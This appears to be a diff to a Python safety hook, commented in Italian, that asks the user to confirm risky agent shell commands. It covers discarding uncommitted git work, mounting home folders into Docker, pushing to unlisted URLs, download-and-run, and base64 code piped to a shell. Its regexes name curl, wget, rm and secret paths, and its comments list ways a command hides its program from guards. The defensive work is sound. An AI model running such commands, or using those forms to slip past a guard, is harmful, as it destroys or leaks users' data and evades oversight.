+                continue  # toglie dallo stage, il file resta com'è
+            if "--" in resto:
+                percorsi = resto[resto.index("--") + 1:]
+            elif sotto == "restore":
+                percorsi = [a for a in resto if not a.startswith("-")]
+            else:
+                percorsi = [a for a in resto if a in (".", "./", ":/", "*")]
+            if not percorsi and not (sotto == "checkout" and any(a in ("-f", "--force") for a in resto)):
+                continue
+            cosa, sposta = f"git {sotto} sui file", False
+            # `cp f /tmp/f && git checkout HEAD -- f`: la copia è appena stata messa da parte nello stesso
+            # comando, e il lavoro non si perde (la controprova di un banco: 2 casi su 1.500 nel ripasso).
+            copiati = {os.path.normpath(a) for n, aa, _ in _programmi_con_cd(_fc.testo_shell(command))
+                       if _fc._nome(n) == "cp" for a in aa[:-1] if not a.startswith("-")}
+            if percorsi and all(os.path.normpath(p) in copiati for p in percorsi):
+                continue
+        basi =[b for b in _basi_dopo_cd(cds, cwd)]
+        # Fuori da un repository git fallisce da solo: niente da perdere, niente da chiedere.
+        cartelle = [(_resolve(cartella, b) if cartella else b) for b in basi]
+        if not altrove and cartelle and all(c and os.path.isdir(c) and _git_esegui(c, "rev-parse", "--git-dir") is None
+                                            for c in cartelle):
+            continue
+        pulito = not altrove and not sposta and bool(basi)
+        for base in basi:
+            repo = _resolve(cartella, base) if cartella else base
+            if not pulito or not repo or not os.path.isdir(repo):
+                pulito = False
+                break
+            stato = _git_esegui(repo, "status", "--porcelain", "--untracked-files=no", "--", *percorsi)
+            if stato is None or stato.strip():
+                pulito = False
+        if pulito:
+            continue
+        if sposta:
+            return (f"{cosa} verso un altro commit: le modifiche non salvate spariscono, e i commit dopo quel punto "
+                    "escono dal ramo. Conferma solo se sai cosa lasci.")
+        return (f"{cosa}: le modifiche non salvate in un commit spariscono, e git non le sa ridare. "
+                "Controlla con `git status` e `git diff` prima di confermare.")
+    return None
+
+
+# S9: una cartella intera spostata fuori dal suo posto.
+_CARTELLE_DI_CASA = frozenset("Documents Desktop Downloads Pictures Movies Music Library Applications Public "
+                              ".ssh .gnupg .aws .config".split())
+
+
+def _sposta_cartella(command, cwd):
+    """Il percorso se un mv porta via la home, una sua cartella standard o un albero protetto: per chi lavora lì è
+    come cancellarla. Rinominare dentro la stessa cartella passa."""
+    for nome, args, cds in _programmi_con_cd(_fc.testo_shell(command)):
+        if _fc._nome(nome) != "mv":
+            continue
+        liberi, destinazione, i = [], None, 0
+        args = _senza_redirezioni(args)
+        while i < len(args):
+            a = args[i]
+            if a in ("-t", "--target-directory") and i + 1 < len(args):
+                destinazione = args[i + 1]
+                i += 2
+                continue
+            if a.startswith("--target-directory="):
+                destinazione = a.split("=", 1)[1]
+            elif not a.startswith("-") or a == "-":
+                liberi.append(a)
+            i += 1
+        if destinazione is None and len(liberi) >= 2:
+            destinazione, liberi = liberi[-1], liberi[:-1]
+        if destinazione is None:
+            continue
+        casa = os.path.normpath(_home())
+        for base in _basi_dopo_cd(cds, cwd):
+            dest = _resolve(destinazione, base)
+            for sorgente in liberi:
+                p = _resolve(sorgente, base)
+                if not p:
+                    continue
+                reale = _reale(p) or p
+                grave = any(q == casa or (os.path.dirname(q) == casa and os.path.basename(q) in _CARTELLE_DI_CASA)
+                            or _is_protected_tree(q) for q in (p, reale))
+                if not grave or not os.path.isdir(p):
+                    continue
+                if dest and os.path.dirname(dest) == os.path.dirname(p) and not os.path.isdir(dest) \
+                        and not destinazione.rstrip("'\"").endswith(("/", os.sep)) \
+                        and os.path.basename(dest) != ".Trash":
+                    continue  # un nome nuovo nella stessa cartella
+                return p
+    return None
+
+
+# S9: perl e ruby che cancellano una cartella intera.
+_PERL_RUBY_CANCELLA = re.compile(r"\b(?:remove_tree|rmtree)\s*\(?|\bFileUtils\.(?:rm_rf|rm_r|remove_dir|remove_entry\w*)\b|"
+                                 r"\brm_rf\s*\(")
+
+
+def _altri_cancellano(testo):
+    for parola, args in _comandi_ovunque(testo):
+        nome = _fc._nome(parola)
+        if nome in ("perl", "ruby") and _PERL_RUBY_CANCELLA.search(" ".join(args)):
+            return nome
+    return None
+
+
+# S9: docker che monta in scrittura la home, la radice o un albero protetto.
+def _docker_monta(command, cwd):
+    """Il percorso se un docker run monta in scrittura la home, la radice del disco o un albero protetto: il
+    comando del container può cancellare o leggere tutto, e i suoi percorsi la guardia non li conosce."""
+    casa = os.path.normpath(_home())
+    for parola, args in _comandi_ovunque(_fc.testo_shell(command)):
+        if _fc._nome(parola) not in ("docker", "podman", "nerdctl") or not any(a in ("run", "create") for a in args[:4]):
+            continue
+        monti = []
+        for i, a in enumerate(args):
+            valore = None
+            if a in ("-v", "--volume", "--mount") and i + 1 < len(args):
+                valore = args[i + 1]
+            elif a.startswith(("--volume=", "--mount=")):
+                valore = a.split("=", 1)[1]
+            elif re.match(r"^-v.+", a) and not a.startswith("--"):
+                valore = a[2:]
+            if not valore:
+                continue
+            if "=" in valore and ("source=" in valore or "src=" in valore):
+                campi = dict(c.split("=", 1) for c in valore.split(",") if "=" in c)
+                if campi.get("type", "bind") != "bind":
+                    continue
+                monti.append((campi.get("source") or campi.get("src") or "", "readonly" in valore or "ro" in valore.split(",")))
+            else:
+                parti = valore.split(":")
+                if len(parti) < 2:
+                    continue
+                monti.append((parti[0], "ro" in parti[2].split(",") if len(parti) > 2 else False))
+        for sorgente, sola_lettura in monti:
+            if sola_lettura or not sorgente or not (sorgente.startswith(("/", "~", "$", ".")) or sorgente == "~"):
+                continue
+            p = _resolve(sorgente.replace("$PWD", cwd or "").replace("${PWD}", cwd or ""), cwd)
+            if p is None:
+                return sorgente
+            claude = os.path.join(casa, ".claude")
+            if p == casa or casa.startswith(p.rstrip(os.sep) + os.sep) or p == os.path.normpath("/") or \
+                    p == claude or p.startswith(claude + os.sep) or p == os.path.normpath(_projects_base()) or \
+                    (os.path.dirname(p) == casa and os.path.basename(p) in _CARTELLE_DI_CASA):
+                return p
+    return None
+
+
+# S13: git push verso un indirizzo scritto nel comando, che il repository non ha fra i suoi remoti.
+_INDIRIZZO_REMOTO = re.compile(r"^(?:[a-z][a-z0-9+.-]*://|[\w.-]+@[\w.-]+:|[\w-]+(?:\.[\w-]+)+:(?!\d+$))", re.IGNORECASE)
+
+
+def _push_altrove(command, cwd):
+    """L'indirizzo se un git push va a un URL scritto a mano che non è fra i remoti del repository."""
+    for nome, args, cds in _programmi_con_cd(_fc.testo_shell(command)):
+        if _fc._nome(nome) != "git":
+            continue
+        cartella, sotto, resto = _git_parti(args)
+        if sotto != "push":
+            continue
+        liberi, salta = [], False
+        for a in _senza_redirezioni(resto):
+            if salta:
+                salta = False
+            elif a in ("-o", "--push-option", "--receive-pack", "--exec"):
+                salta = True
+            elif a == "--repo":
+                salta = True
+            elif a.startswith("--repo="):
+                liberi.insert(0, a.split("=", 1)[1])
+            elif not a.startswith("-"):
+                liberi.append(a)
+        if "--repo" in resto and resto.index("--repo") + 1 < len(resto):
+            liberi.insert(0, resto[resto.index("--repo") + 1])
+        if not liberi or not _INDIRIZZO_REMOTO.match(liberi[0]):
+            continue
+        indirizzo = liberi[0]
+        noto = True
+        for base in _basi_dopo_cd(cds, cwd):
+            repo = _resolve(cartella, base) if cartella else base
+            remoti = _git_esegui(repo, "remote", "-v") if repo and os.path.isdir(repo) else None
+            if remoti is None or indirizzo.rstrip("/") not in [x.rstrip("/") for r in remoti.splitlines()
+                                                                for x in r.split()[1:2]]:
+                noto = False
+        if not noto:
+            return indirizzo
+    return None
+
+
+# --- Programmi nascosti alle guardie (#6323, 22/11/2026) ---
+# Le guardie leggono il nome del programma, e quattro forme lo tolgono dal testo: un nome calcolato quando il
+# comando gira ($(…), backtick, una variabile, un alias o una funzione dello stesso comando), xargs, un testo
+# che una shell o un interprete esegue dallo stdin, il codice inline di un interprete. Da sole sono comuni e
+# innocue. Con una parola pericolosa nel comando, la guardia chiede: su 24.493 comandi Bash veri chiede su 52
+# (0,21%). Le forme provate stanno in una sonda privata (SECURITY.md); il banco pubblico è
+# tests/test_programmi_nascosti_2026_11_22.py. La regola parla per ultima: le regole che leggono il programma
+# restano prima, coi loro messaggi.
+# Una parola preceduta da un punto è un metodo (`arr.push(x)`, `git.reset`), non un programma.
+_PAROLA_PERICOLOSA = re.compile(r"(?<![\w.$-])(rm|unlink|shred|push|reset|clean|curl|wget|bw|gh)(?![\w-])", _RE_NOMI)
+# curl e wget scritti in una lista python di soli testi letterali, passata direttamente a chi lancia
+# (`subprocess.run(['curl', '-s', 'https://x'])`), sono un programma visibile: exfil-guard legge l'invio di un
+# file anche in quella forma (_FINE_ARG, 21/10/2026), e il GET lo giudica il classificatore, come scritto in
+# chiaro (#6353, 22/11/2026). Un argomento calcolato (una variabile, un f-string, `+ args`) lascia la lista
+# nascosta. rm, push, gh e bw in una lista chiedono ancora: nessuna guardia li legge lì.
+_LISTA_LETTERALE = re.compile(
+    r"\b(?:run|Popen|call|check_call|check_output)\s*\(\s*\[\s*(['\"])(curl|wget)\1"
+    r"(?:\s*,\s*(?:'[^'\\\n]*'|\"[^\"\\\n]*\"))*\s*,?\s*\](?=\s*[,)])", _RE_NOMI)
+_FUNZIONE_DEFINITA = re.compile(r"(?:^|[;&|(){\n]|\b(?:then|do|else))\s*(?:function\s+[A-Za-z_][\w:.-]*(?:\s*\(\s*\))?"
+                                r"|[A-Za-z_][\w:.-]*\s*\(\s*\))\s*[{(]")
+_INTERPRETI_INLINE = {"deno": ("eval",), "bun": ("-e", "--eval", "-p", "--print"), "osascript": ("-e",)}
+# Il codice di un interprete lancia un programma solo con una di queste primitive, per famiglia. Senza, il codice
+# che cita `rm` in un testo (`s.replace("rm -rf", "")`) non esegue niente: la misura del 22/11/2026 dava lì metà
+# delle conferme a vuoto. Il backtick esegue in perl, ruby e php; in python è testo. `cur.execute(` e
+# `re.compile(` non contano.
+_LANCIA_PYTHON = (r"\b(?:system|popen|Popen|subprocess|exec[lv]\w*|spawn\w*|posix_spawn\w*|pty|__import__|"
+                  r"importlib|getattr|ctypes)\b|(?<![\w.])(?:exec|eval)\s*\(")
+_CODICE_LANCIA = {
+    "python": re.compile(_LANCIA_PYTHON),
+    "node": re.compile(r"\b(?:child_process|execa|shelljs|eval|Function|vm|process\.binding)\b|"
+                       r"\brequire\s*\(\s*(?!['\"`][\w@/.:-]*['\"`]\s*\))|\bimport\s*\(|\$`"),
+    "perl": re.compile(r"\b(?:system|exec|qx|popen|spawn\w*|Open3|eval|shell_exec|passthru|proc_open|"
+                       r"pcntl_exec|IO\.popen|Kernel)\b|`|%x|\bopen\s*\([^)]*\|"),
+    "osascript": re.compile(r"\bdo\s+(?:shell\s+)?script\b|doShellScript|\bObjC\b|NSTask", re.IGNORECASE),
+}
+for _f in ("ruby", "php"):
+    _CODICE_LANCIA[_f] = _CODICE_LANCIA["perl"]
+for _f in ("deno", "bun"):
+    _CODICE_LANCIA[_f] = re.compile(_CODICE_LANCIA["node"].pattern + r"|\bDeno\.(?:Command|run)\b|\bBun\.(?:spawn\w*|\$)")
+# Programmi che stampano il testo che ricevono: un percorso nei loro argomenti può finire a una shell.
+_STAMPANO = frozenset(("echo", "printf", "print"))
+
+
+def _segreti_visti(comandi):
+    """Quanti percorsi dei segreti stanno negli argomenti di un programma visibile, che le regole sopra hanno
+    già giudicato (`ssh -i ~/.ssh/id_x host`)."""
+    n = 0
+    for parola, args in comandi:
+        nome = _fc._nome(parola)
+        if "$" in parola or "`" in parola or nome in _STAMPANO or nome in _SHELL_STDIN or \
+                _INTERPRETI_STDIN.match(nome) or nome in _INTERPRETI_INLINE or nome in ("xargs", "gxargs", "alias"):
+            continue
+        n += sum(len(_segreti_in(a)) for a in args)
+    return n
+
+
+def _segreti_in(testo):
+    return [m.start() for r in (SECRET_PATH_RE, _SECRET_DIR_RE, ENV_RE) for m in r.finditer(testo)]
+
+
+def _parola_pericolosa(command, comandi):
+    """La parola pericolosa che le guardie non vedono come programma, o None.
+
+    Una parola che nel comando è un programma visibile (`bw status | python3 -c …`), o il sottocomando di un git
+    o di un gh visibile, la giudicano già le regole che leggono il programma: conta solo se compare più volte di
+    così. Lo stesso per un percorso dei segreti negli argomenti di un programma visibile."""
+    visti = collections.Counter()
+    for parola, args in comandi:
+        nome = _fc._nome(parola)
+        visti[nome] += 1
+        if nome in ("git", "gh"):
+            for a in args:
+                visti[_fc._nome(a)] += 1
+    for m in _LISTA_LETTERALE.finditer(command):
+        visti[_fc._nome(m.group(2))] += 1
+    trovate = collections.Counter(_fc._nome(m.group(1)) for m in _PAROLA_PERICOLOSA.finditer(command))
+    for parola, quante in trovate.items():
+        if quante > visti[parola]:
+            return parola
+    if len(_segreti_in(command)) > _segreti_visti(comandi):
+        return "un percorso dei segreti"
+    return None
+
+
+def _famiglia(nome):
+    return "python" if nome.startswith("python") else ("node" if nome.startswith("node") else nome)
+
+
+def _codice_di_interprete(nome, args):
+    """'inline' se l'interprete riceve il codice negli argomenti (`python3 -c`, `perl -ne`), 'stdin' se lo legge
+    dallo stdin (`| sh`, `python3 -`, `bash <<< 'x'`, `bash < f`), None se esegue uno script o un modulo."""
+    shell = nome in _SHELL_STDIN
+    famiglia = _famiglia(nome)
+    inline = _INTERPRETI_CODICE.get(famiglia, ()) + _INTERPRETI_INLINE.get(famiglia, ())
+    valore = _INTERPRETI_VALORE.get(famiglia, ())
+    i = 0
+    while i < len(args):
+        a = args[i]
+        passo = _fc.redirezione(args, i)
+        if passo:
+            i += passo[0]  # `bash <<< 'x'`, `bash < f`: il testo arriva dallo stdin
+            continue
+        if a == "--":
+            return "stdin" if i + 1 >= len(args) or args[i + 1] == "-" else None
+        if a in ("-", "/dev/stdin", "/dev/fd/0"):
+            return "stdin"
+        if not a.startswith("-"):
+            return "inline" if nome in _INTERPRETI_INLINE and a in inline else None  # `deno eval`; altro: script
+        if shell:
+            if _fc._GRUPPO_C.match(a):
+                return None  # `bash -c`: forma_comando legge già il testo come comando
+            if re.match(r"^-[a-zA-Z]*s[a-zA-Z]*$", a):
+                return "stdin"  # `bash -s -- x`
+            i += _fc._salto(a, "oO", _fc._SHELL_CON_VALORE)
+            continue
+        if famiglia == "python" and (a == "-m" or a.startswith("-m")):
+            return None  # un modulo
+        if a in inline or a.split("=", 1)[0] in inline:
+            return "inline"
+        if famiglia in ("perl", "ruby") and re.match(r"^-[a-zA-Z0-9]*[eE]", a):
+            return "inline"  # `perl -ne`, `perl -lane`, `perl -e'x'`
+        if famiglia in ("python",) and re.match(r"^-[a-zA-Z0-9]*c.", a) and a[1] not in "WX":
+            return "inline"  # `python3 -c'x'`
+        i += 2 if a in valore else 1
+    return "stdin"
+
+
+_CALCOLATO = "un programma il cui nome si calcola quando il comando gira"
+# xargs verso un programma che legge e basta: le parole sono il testo cercato (`xargs grep -n rm`), e conta solo
+# un percorso dei segreti, che il lettore aprirebbe.
+_XARGS_LETTORI = frozenset("grep egrep fgrep rg ag ack wc head tail ls stat file du sort uniq cut echo printf "
+                           "basename dirname realpath readlink".split())
+_XARGS_LETTORE = "xargs, che passa a un lettore i nomi letti dallo stdin"
+
+
+def _forma_nascosta(testo, command, comandi):
+    """La forma che nasconde il programma alle guardie, detta per la persona, o None."""
+    lettore = False
+    for parola, args in comandi:
+        nome = _fc._nome(parola)
+        base = parola.replace("\\", "/").rsplit("/", 1)[-1]
+        if "$" in base or "`" in parola:
+            if re.fullmatch(r"\$\{?[A-Za-z_]\w*\}?", parola) and _variabile_innocua(parola, command):
+                continue  # `C=~/.local/bin/claude; $C rm <id>`
+            return _CALCOLATO
+        if nome == "alias" and any("=" in a for a in args):
+            return "un alias definito nel comando"
+        if nome in ("xargs", "gxargs") and _fc.xargs_resto(args):
+            if _fc._nome(_fc.xargs_resto(args)[0]) in _XARGS_LETTORI:
+                lettore = True
+                continue
+            return "xargs, che passa al programma gli argomenti letti dallo stdin"
+        if nome in _SHELL_STDIN or _INTERPRETI_STDIN.match(nome) or nome in _INTERPRETI_INLINE:
+            codice = _codice_di_interprete(nome, args)
+            lancia = _CODICE_LANCIA.get(_famiglia(nome))
+            if codice and nome not in _SHELL_STDIN and lancia is not None and not lancia.search(command):
+                continue  # codice che non lancia programmi
+            if codice == "stdin":
+                return f"un testo che {nome} esegue dallo stdin"
+            if codice == "inline":
+                return f"il codice di {nome} scritto nel comando"
+    if _FUNZIONE_DEFINITA.search(_maschera_virgolette(testo)):
+        return "una funzione definita nel comando"
+    return _XARGS_LETTORE if lettore else None
+
+
+def _programma_nascosto(testo, command):
+    """Il motivo della conferma se il comando nasconde il programma e contiene una parola pericolosa."""
+    if not _PAROLA_PERICOLOSA.search(command) and not _segreti_in(command):
+        return None
+    comandi = _comandi_ovunque(testo)
+    forma = _forma_nascosta(testo, command, comandi)
+    if not forma:
+        return None
+    # Con un nome calcolato il parser legge male quello che segue: in `$(echo git) push` vede un programma `push`.
+    # Lì nessuna parola conta come già vista.
+    if forma == _XARGS_LETTORE:
+        parola = "un percorso dei segreti" if len(_segreti_in(command)) > _segreti_visti(comandi) else None
+    else:
+        parola = _parola_pericolosa(command, [] if forma == _CALCOLATO else comandi)
+    if not parola:
+        return None
+    parola = parola if parola.startswith("un ") else f'la parola "{parola}"'
+    return (f"Il comando lancia {forma}, e contiene {parola}: le guardie non vedono quale programma gira né con "
+            "quali argomenti. Scrivilo in chiaro, col nome del programma. Conferma solo se sai cosa fa.")
+
+
 def _inert_reference(command: str) -> bool:
     if re.search(r"[;&|]|\$\(|`|<\(|>\(", command):
         return False
@@ -3206,6 +3958,38 @@ def main() -> int:
             "accesso o a un orario, anche fuori da Claude Code. Conferma solo se l'hai chiesto tu."
         )
 
+    # 2a-ter) git config su una chiave che esegue un comando -> ask (21/11/2026, #6259, S4)
+    try:
+        chiave = _git_config_comando(testo)
+    except Exception:
+        chiave = None
+    if chiave:
+        return _ask("avvio-automatico",
+            f"git imposta {chiave}, una chiave il cui valore è un comando: git lo esegue da solo, a ogni stato, "
+            "commit o accesso al remoto. Conferma solo se l'hai chiesto tu."
+        )
+
+    # 2a-quater) un file scaricato ed eseguito nello stesso comando, o codice decodificato e passato a una
+    # shell -> ask (21/11/2026, #6259, S5)
+    try:
+        scaricato = _scarica_ed_esegue(testo, cwd)
+    except Exception:
+        scaricato = None
+    if scaricato:
+        return _ask("scarica-esegue",
+            f"Il comando scarica {scaricato} e lo esegue subito: nessuno ha letto cosa contiene. Meglio "
+            "scaricare, leggere il file e poi eseguirlo. Conferma solo se la fonte è fidata."
+        )
+    try:
+        nascosto = any(_CODICE_NASCOSTO.search(i) for i in _fc.istruzioni(_fc.togli_commenti(testo)))
+    except Exception:
+        nascosto = bool(_CODICE_NASCOSTO.search(testo))
+    if nascosto:
+        return _ask("codice-nascosto",
+            "Il comando decodifica un testo (base64, xxd, openssl) e lo passa a una shell: il codice che gira non "
+            "si legge. Decodificalo e mostralo prima. Conferma solo se sai cosa contiene."
+        )
+
     # 2b) Creazione di un file di unlock -> ask (sbloccherebbe l'auto-modifica)
     sblocco = UNLOCK_RE.search(dritto) or "sblocco" in windows or _writes_config(testo, cwd, _is_unlock, crea=True)
     if sblocco and "claude-md-unlock" in testo and "config-unlock" not in testo:
@@ -3224,6 +4008,11 @@ def main() -> int:
         risolti = _segreti_risolti(command, cwd) or bool(_SECURITY_SEGRETO.search(testo))
     except Exception:
         risolti = False
+    # 21/11/2026 (#6259, S6): find che cerca le chiavi per nome e le fa leggere, e git che stampa la password.
+    try:
+        risolti = risolti or _find_legge_segreti(testo) or _git_credenziali(testo)
+    except Exception:
+        pass
     if _reads_secret(command) or "segreto" in windows or risolti:
         return _ask("segreto",
             "Lettura di un file segreto via shell (chiave privata, credenziali, "
@@ -3334,6 +4123,50 @@ def main() -> int:
     except Exception:
         return _ask("rmtree-illeggibile", f"{chi} che la guardia non riesce a leggere: controlla prima di confermare.")
 
+    # 7-bis) perl e ruby che cancellano una cartella intera -> ask (21/11/2026, #6259, S9)
+    try:
+        altro = _altri_cancellano(testo)
+    except Exception:
+        altro = None
+    if altro:
+        return _ask("rmtree-variabile",
+            f"{altro} cancella una cartella intera (remove_tree, rmtree, FileUtils.rm_rf), senza cestino. "
+            "Controlla quale prima di confermare."
+        )
+
+    # 7-ter) mv di una cartella intera della home o di un albero protetto -> ask (S9)
+    try:
+        spostata = _sposta_cartella(command, cwd)
+    except Exception:
+        spostata = None
+    if spostata:
+        return _ask("sposta-cartella",
+            f"mv sposta via una cartella intera ({spostata}): la home, una sua cartella o un albero protetto. "
+            "I programmi che la cercano lì non la trovano più, e in /tmp sparisce al riavvio. Conferma solo se "
+            "vuoi davvero spostarla."
+        )
+
+    # 7-quater) docker run con la home, la radice o un albero protetto montati in scrittura -> ask (S9)
+    try:
+        montata = _docker_monta(command, cwd)
+    except Exception:
+        montata = None
+    if montata:
+        return _ask("docker-monta",
+            f"docker monta in scrittura {montata}: il comando del container può cancellare o leggere tutto quello "
+            "che c'è dentro. Monta solo la cartella che serve, o aggiungi :ro. Conferma solo se è voluto."
+        )
+
+    # 7-quinquies) git reset --hard, checkout -- e restore su modifiche non salvate -> ask (S9)
+    try:
+        scarta = _git_scarta(command, cwd)
+    except Exception:
+        scarta = ("git reset --hard, checkout o restore che la guardia non riesce a leggere: controlla prima di "
+                  "confermare.") if re.search(r"\bgit\b[^\n;&|]*\b(?:reset\b[^\n;&|]*--hard|checkout\b[^\n;&|]*\s--\s|restore\b)",
+                                              command) else None
+    if scarta:
+        return _ask("git-scarta", scarta)
+
     # 8) git clean -f -> ask: i file non tracciati non stanno in nessun commit.
     if _git_clean_forzato(command):
         return _ask("git-clean",
@@ -3351,6 +4184,17 @@ def main() -> int:
             "git push con la destinazione riscritta nello stesso comando (git -c remote.<nome>.url=, "
             "insteadOf, pushurl, --config-env o GIT_CONFIG_*): il contenuto andrebbe a un indirizzo che il "
             "repository non ha configurato. Conferma solo se l'indirizzo è tuo."
+        )
+
+    # 8-bis-b) push verso un indirizzo scritto nel comando e non configurato -> ask (21/11/2026, #6259, S13)
+    try:
+        altrove = _push_altrove(command, cwd)
+    except Exception:
+        altrove = None
+    if altrove:
+        return _ask("git-destinazione",
+            f"git push verso {altrove}, un indirizzo scritto nel comando che non è fra i remoti del repository: "
+            "il codice andrebbe lì. Conferma solo se l'indirizzo è tuo."
         )
 
     # 8-ter) push che riscrive o cancella rami remoti -> ask (finding 5): il rail dei deny, in ogni forma.
@@ -3396,6 +4240,15 @@ def main() -> int:
                   "prima di confermare.") if re.search(r"\bcommit\b.*--am", command) else None
     if altrui:
         return _ask("git-amend", altrui)
+
+    # 11) Un programma nascosto alle guardie con una parola pericolosa nel comando -> ask (#6323, 22/11/2026).
+    # Parla per ultima: le regole sopra leggono il programma e hanno un messaggio più preciso.
+    try:
+        nascosto = _programma_nascosto(testo, command)
+    except Exception:
+        nascosto = None
+    if nascosto:
+        return _ask("codice-nascosto", nascosto)
 
     return 0
 
